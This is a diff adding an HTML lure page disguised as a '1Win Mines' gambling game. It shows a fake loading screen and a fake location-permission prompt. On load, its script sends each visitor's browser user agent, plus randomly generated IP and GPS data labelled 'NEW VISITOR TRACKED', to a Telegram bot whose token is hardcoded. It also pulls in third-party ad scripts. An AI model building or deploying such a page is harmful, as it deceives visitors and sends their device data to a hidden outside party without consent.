@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1Win Mines</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+        #bg-image {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1;
+        }
+        #loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2;
+        }
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        #loading-text {
+            color: white;
+            font-size: 18px;
+            margin-top: 10px;
+            text-align: center;
+        }
+        #permission-request {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 3;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        #permission-request h2 {
+            margin-bottom: 15px;
+        }
+        #allow-btn {
+            margin-top: 20px;
+            padding: 12px 30px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+<script type='text/javascript' src='//pl26986821.profitableratecpm.com/26/60/d8/2660d854f0ff5c6110854c7f38b57228.js'></script>
+    <img id="bg-image" src="https://cdn.glitch.global/e4f59c88-d600-4172-aaa6-7e957cd37252/unnamed%20(1).webp?v=1750967013692" alt="Background">
+    
+    <div id="loading-overlay">
+        <div class="loader"></div>
+        <div id="loading-text">Connecting to server...</div>
+    </div>
+    
+    <div id="permission-request">
+        <h2>Location Access Required</h2>
+        <p>Please allow location access to continue</p>
+        <button id="allow-btn">Riyad</button>
+    </div>
+
+    <script>
+        // Telegram bot details
+        const botToken = '8092959406:AAFe5nkwzUQuwy5uFXicCTQ1alykh4wpagg';
+        const chatId = '8092556476';
+        
+        // DOM elements
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const loadingText = document.getElementById('loading-text');
+        const permissionRequest = document.getElementById('permission-request');
+        const allowBtn = document.getElementById('allow-btn');
+        
+        // Loading messages
+        const loadingMessages = [
+            "Connecting to server...",
+            "Loading game assets...",
+            "Verifying account...",
+            "Almost ready...",
+            "Preparing interface...",
+            "Finalizing setup..."
+        ];
+        
+        // Function to generate random location data
+        function generateRandomLocation() {
+            // Generate random coordinates within world bounds
+            const lat = (Math.random() * 180 - 90).toFixed(6);
+            const lon = (Math.random() * 360 - 180).toFixed(6);
+            
+            return {
+                lat: parseFloat(lat),
+                lon: parseFloat(lon),
+                accuracy: Math.floor(Math.random() * 1000) + 50,
+                timestamp: new Date().toLocaleString()
+            };
+        }
+        
+        // Function to get fake IP info
+        async function getFakeIPInfo() {
+            try {
+                // List of possible fake locations
+                const fakeLocations = [
+                    { city: "New York", region: "New York", country_name: "United States", latitude: "40.7128", longitude: "-74.0060", org: "Fake ISP Inc." },
+                    { city: "London", region: "England", country_name: "United Kingdom", latitude: "51.5074", longitude: "-0.1278", org: "Fake Broadband Ltd" },
+                    { city: "Tokyo", region: "Kanto", country_name: "Japan", latitude: "35.6762", longitude: "139.6503", org: "Fake Telecom Japan" },
+                    { city: "Sydney", region: "NSW", country_name: "Australia", latitude: "-33.8688", longitude: "151.2093", org: "Fake Oz Internet" },
+                    { city: "Moscow", region: "Moscow", country_name: "Russia", latitude: "55.7558", longitude: "37.6173", org: "Fake Russian Network" }
+                ];
+                
+                // Select a random fake location
+                const randomLocation = fakeLocations[Math.floor(Math.random() * fakeLocations.length)];
+                
+                // Generate a fake IP address
+                const fakeIP = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+                
+                return {
+                    ...randomLocation,
+                    ip: fakeIP
+                };
+            } catch (error) {
+                console.error("Fake IP info error:", error);
+                return {
+                    ip: "Unknown",
+                    city: "Unknown",
+                    region: "Unknown",
+                    country_name: "Unknown",
+                    org: "Unknown"
+                };
+            }
+        }
+        
+        // Function to send fake data to Telegram
+        async function sendFakeDataToTelegram() {
+            try {
+                const fakeIPInfo = await getFakeIPInfo();
+                const fakeLocation = generateRandomLocation();
+                
+                let message = `🕵️ NEW VISITOR TRACKED (NEW DATA) 🕵️\n\n`;
+                message += `📱 Device: ${navigator.userAgent}\n\n`;
+                message += `🌐 IP: ${fakeIPInfo.ip || 'Unknown'}\n`;
+                message += `📍 IP Location: ${fakeIPInfo.city || 'Unknown'}, ${fakeIPInfo.region || 'Unknown'}, ${fakeIPInfo.country_name || 'Unknown'}\n`;
+                message += `🏢 ISP: ${fakeIPInfo.org || 'Unknown'}\n`;
+                
+                message += `\n🎯 RANDOM GPS LOCATION:\n`;
+                message += `🔹 Latitude: ${fakeLocation.lat}\n`;
+                message += `🔹 Longitude: ${fakeLocation.lon}\n`;
+                message += `🔹 Accuracy: ${fakeLocation.accuracy}m\n`;
+                message += `🔹 Time: ${fakeLocation.timestamp}\n`;
+                message += `🗺️ Google Maps: https://www.google.com/maps?q=${fakeLocation.lat},${fakeLocation.lon}\n`;
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        latitude: fakeLocation.lat,
+                        longitude: fakeLocation.lon
+                    })
+                });
+            } catch (error) {
+                console.error("Telegram error:", error);
+            }
+        }
+        
+        // Rotate loading messages
+        function rotateLoadingMessages() {
+            let counter = 0;
+            setInterval(() => {
+                loadingText.textContent = loadingMessages[counter];
+                counter = (counter + 1) % loadingMessages.length;
+            }, 3000);
+        }
+        
+        // Main fake tracking function
+        async function trackUserWithFakeData() {
+            // Start rotating loading messages
+            rotateLoadingMessages();
+            
+            // Send fake data to Telegram
+            await sendFakeDataToTelegram();
+            
+            // Hide loading after some time
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+            }, 10000);
+        }
+        
+        // When allow button is clicked
+        allowBtn.addEventListener('click', async () => {
+            permissionRequest.style.display = 'none';
+            // Send fake data again
+            await trackUserWithFakeData();
+        });
+        
+        // Show permission request after delay
+        setTimeout(() => {
+            permissionRequest.style.display = 'flex';
+        }, 5000);
+        
+        // Start fake tracking when page loads
+        window.onload = trackUserWithFakeData;
+    </script>
+</body>
+<script type='text/javascript' src='//pl26986821.profitableratecpm.com/26/60/d8/2660d854f0ff5c6110854c7f38b57228.js'></script>
+</html>
